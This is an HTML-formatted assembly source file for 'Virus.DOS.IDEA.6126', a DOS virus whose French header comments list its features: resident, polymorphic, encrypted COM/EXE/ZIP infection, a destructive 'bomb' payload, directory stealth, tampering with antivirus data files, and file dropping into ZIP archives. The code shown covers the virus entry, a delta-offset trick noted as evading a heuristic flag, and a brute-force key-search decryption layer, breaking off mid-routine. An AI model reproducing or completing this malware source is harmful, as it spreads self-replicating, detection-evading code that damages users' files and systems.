<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.IDEA.6126 - idea.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; IDEA Virus COM/EXE/ZIP Infecteur Resident polymorphe lourdement crypté</span><span class="sc0">
</span><span class="sc1">; version définitive </span><span class="sc0">

</span><span class="sc1">; modif par rapport au 8: changement de la bombe + isolation de la fin sinon exe gen2 foire</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 9: chgmnt des fichiers antivir.dat + pile des exe dans le code (bug)</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 10: gain de taille par des calls, remise pushcs/popds dans FSE</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 11: dir stealth</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 12: detournement et remise int 24h, gerbe du "e"</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 13: push_all/pop_all + tamere.txt ds zip avecDIR + stealth sous W95</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 14: droppe readme.com ds zip avec CRC</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 15: droppe mini-demo + reco zip deja infecte + garde zip timedate</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 16: cbw ds bomb + plus de stop bomb + plus de message int21</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 17: 999&lt;com&lt;57000 + size*3 de RAM + compat DOS7 + bmb stop</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 18: runtime inf command.com W95</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 19: 3 mini-demos</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 20: 1/2 infect zip + zip&gt;130 pas inf + opti taille + eicar</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 21: bombe adaptée aux divers jeux de cara </span><span class="sc0">
</span><span class="sc1">; modif par rapport au 22: bug de merde ds bombe (et gaffe aux shR si, ca divise pas par 2)</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 23: ajouté findfirst dans W95 stealth, ameliore routine. Au poil.</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 24: en mem?  NON: installe</span><span class="sc0">
</span><span class="sc1">;                       OUI: dos box?   NON: stop</span><span class="sc0">
</span><span class="sc1">;                                   OUI: deja 2 copies TSR?     NON: installe avec marqueur à 1</span><span class="sc0">
</span><span class="sc1">;                                                       OUI: stop</span><span class="sc0">
</span><span class="sc1">;       (donc memoire bouffee en dos box par au maximum 2 reinstallations)</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 25: changé proba inf zip (1/2) + bug FSE Rajaat</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 26: win.com de W3.1 en runtime (couillafixer: time/date n'importe quoi sous 2eme inf W95)</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 27: couille fixée</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 28: trop de plantages, donc plus de trojanization de command/win</span><span class="sc0">
</span><span class="sc1">; modif par rapport au 29: correct bug ENUNS</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">        </span><span class="sc1">;equivalent a "jmp start_virus" </span><span class="sc0">
</span><span class="sc5">signature</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"i"</span><span class="sc0">                </span><span class="sc1">;signature du virus   </span><span class="sc0">
 
</span><span class="sc1">;*********************HOTE*****************************</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">     </span><span class="sc1">;on affiche               ;*</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                </span><span class="sc1">;un petit message         ;*</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;a la con, puis           ;*</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">           </span><span class="sc1">;retour                   ;*</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                </span><span class="sc1">;au DOS                   ;*</span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"fake host$"</span><span class="sc0">         </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;******************************************************  </span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;                       COUCHE DE CRYPTAGE FSE            *</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">

</span><span class="sc5">debut_cryptage_FSE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">start_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-----mettre ss=cs et sp=FFFE</span><span class="sc0">

</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc1">;********** Recuperation du Delta Offset du code non resident **********</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;routine qui</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;evite le flag E</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">                                 </span><span class="sc1">;piquee a Slacker</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                                  </span><span class="sc1">;et simplifiee</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-----mettre es=ds=cs et sauvegarder es original deux fois</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;                       COUCHE DE CRYPTAGE NOKEY                  *</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------essayer TOUTES les combinaisons sur un premier octet-------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;because cet offset a été crypté pas vide</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                      </span><span class="sc1">;clef du xor2 entre 0 et 15 (+1 obligé)</span><span class="sc0">
</span><span class="sc5">teste_xor2</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;boucle xor2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;clef du xor repart de 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;clef du add repart de 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_ror</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;clef du rol repart de 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;sauver compteur xor2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;clef du rol entre 0 et 7 (+1 obligé)</span><span class="sc0">
    </span><span class="sc5">teste_ror</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;boucle ror</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;clef du xor repart de 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;clef du add repart de 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">;sauver compteur rol</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">                      </span><span class="sc1">;clef du add entre 0 et 31</span><span class="sc0">
    </span><span class="sc5">teste_sub</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;boucle sub</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;clef du xor repart de 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;sauver compteur add</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">                          </span><span class="sc1">;clef du xor entre 0 et 63</span><span class="sc0">
        </span><span class="sc5">teste_xor</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;boucle xor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;chope 1er octet</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decrypte_ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0868Bh</span><span class="sc0">                      </span><span class="sc1">;compare avec vraie valeur</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite1</span><span class="sc0">                          </span><span class="sc1">;pas la bonne combinaison</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trouve</span><span class="sc0">                         </span><span class="sc1">;bonne combinaison</span><span class="sc0">
        </span><span class="sc5">suite1</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;on continue</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;clef xor suivante</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">teste_xor</span><span class="sc0">                      </span><span class="sc1">;toute les clefs xor2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;clef add suivante</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;recup compteur add</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">teste_sub</span><span class="sc0">                  </span><span class="sc1">;toutes les clefs add</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_ror</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;clef ror suivante</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;recup compteur ror</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">teste_ror</span><span class="sc0">              </span><span class="sc1">;toutes les clefs ror</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;clef xor2 suivante</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;recup compteur xor2</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">teste_xor2</span><span class="sc0">         </span><span class="sc1">;toutes les clefs xor2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">               </span><span class="sc1">;retour au DOS</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;si jamais il ne trouve pas la combinaison, stop</span><span class="sc0">

</span><span class="sc5">_xor</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_sub</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ror</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_xor2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crc_clef</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--------essayer la combinaison intéressante sur le deuxième octet---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">trouve</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;le premier octet est correctement décrypté</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;et on teste le deuxième</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decrypte_ax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069B8h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trouve2</span><span class="sc0">                    </span><span class="sc1">;2ème bien décrypté =&gt; voir le 3ème</span><span class="sc0">
</span><span class="sc5">suite2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------essayer la combinaison intéressante sur le troisième octet---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">trouve2</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;le 2ème octet est correctement décrypté</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;et on teste le 3ème</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decrypte_ax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0375h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trouve3</span><span class="sc0">                    </span><span class="sc1">;3ème bien décrypté =&gt; voir le 4ème</span><span class="sc0">
</span><span class="sc5">suite5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------La combinaison est la bonne---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">trouve3</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;le 3ème octet est correctement décrypté</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------calculer le CRC---------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_sub</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_ror</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--------------comparer CRC avec celui stocké dans le virus--------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;mettre CRC calculé sur stack</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;le CRC est stocké entre [crc_clef] et [crc_clef+16]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;avant, il y a des 0... Faut trouver l'endroit</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crc_clef</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;début de la zone possible de stockage</span><span class="sc0">
</span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                      </span><span class="sc1">;tant que c'est 0, continuer</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;di a dépassé d'un octet</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;recup CRC calculé</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;CRC calculé = CRC stocké?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">decryptage</span><span class="sc0">                   </span><span class="sc1">;oui =&gt; on décrypte</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------cette combinaison de clef est la bonne: décryptage------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">decryptage</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">                              </span><span class="sc1">;ajustement de la pile (7 push)</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc4">]</span><span class="sc1">;boucle de décryptage classique</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">;avec les clefs trouvées</span><span class="sc0">
